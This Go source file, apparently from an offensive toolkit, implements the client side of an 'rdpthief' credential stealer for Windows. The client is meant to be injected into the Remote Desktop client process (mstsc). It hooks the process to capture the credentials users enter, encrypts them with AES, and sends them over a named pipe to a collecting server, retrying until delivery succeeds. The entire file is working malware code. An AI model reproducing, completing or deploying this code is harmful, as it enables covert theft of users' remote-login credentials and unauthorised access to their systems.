// +build windows

package rdpthief

import (
	"context"
	"crypto/sha256"
	"net"
	"sync"
	"time"

	"github.com/Microsoft/go-winio"

	"project/internal/convert"
	"project/internal/crypto/aes"
	"project/internal/patch/msgpack"
	"project/internal/xpanic"
)

// Client will be injected to the mstsc process, if get new credential,
// it will connect to the server by named pipe, and send it.
type Client struct {
	pipeName string

	credCh chan *Credential
	cbc    *aes.CBC
	hook   *Hook

	ctx       context.Context
	cancel    context.CancelFunc
	closeOnce sync.Once
	wg        sync.WaitGroup
}

// NewClient is used to create a rdpthief client.
func NewClient(pipeName, password string) (*Client, error) {
	client := Client{
		pipeName: pipeName,
		credCh:   make(chan *Credential, 1024),
	}
	passHash := sha256.Sum256([]byte(password))
	cbc, err := aes.NewCBC(passHash[:], passHash[:aes.IVSize])
	if err != nil {
		return nil, err
	}
	client.cbc = cbc
	client.ctx, client.cancel = context.WithCancel(context.Background())
	hook := NewHook(client.recordCred)
	err = hook.Install()
	if err != nil {
		return nil, err
	}
	client.hook = hook
	client.wg.Add(1)
	go client.sendCredLoop()
	return &client, nil
}

func (client *Client) recordCred(cred *Credential) {
	select {
	case client.credCh <- cred:
	case <-client.ctx.Done():
	}
}

func (client *Client) sendCredLoop() {
	defer client.wg.Done()
	defer func() {
		if r := recover(); r != nil {
			xpanic.Log(r, "Client.sendCredLoop")
		}
	}()
	for {
		select {
		case cred := <-client.credCh:
			client.sendCred(cred)
		case <-client.ctx.Done():
			return
		}
	}
}

func (client *Client) sendCred(cred *Credential) {
	// connect to the rdpthief server
	var (
		pipe net.Conn
		err  error
	)
	for {
		pipe, err = client.connect()
		if err == nil {
			break
		}
		select {
		case <-time.After(15 * time.Second):
		case <-client.ctx.Done():
			return
		}
	}
	defer func() { _ = pipe.Close() }()
	// send credential
	data, err := msgpack.Marshal(cred)
	if err != nil {
		return
	}
	enc, err := client.cbc.Encrypt(data)
	if err != nil {
		return
	}
	_ = pipe.SetWriteDeadline(time.Now().Add(10 * time.Second))
	_, _ = pipe.Write(convert.BEUint32ToBytes(uint32(len(enc))))
	_, _ = pipe.Write(enc)
}

func (client *Client) connect() (net.Conn, error) {
	ctx, cancel := context.WithTimeout(client.ctx, 10*time.Second)
	defer cancel()
	return winio.DialPipeContext(ctx, `\\.\pipe\`+client.pipeName)
}

// Close is used to close client, it will uninstall hook.
func (client *Client) Close() (err error) {
	client.closeOnce.Do(func() {
		client.cancel()
		client.wg.Wait()
		err = client.hook.Uninstall()
		client.hook.Clean()
	})
	return
}
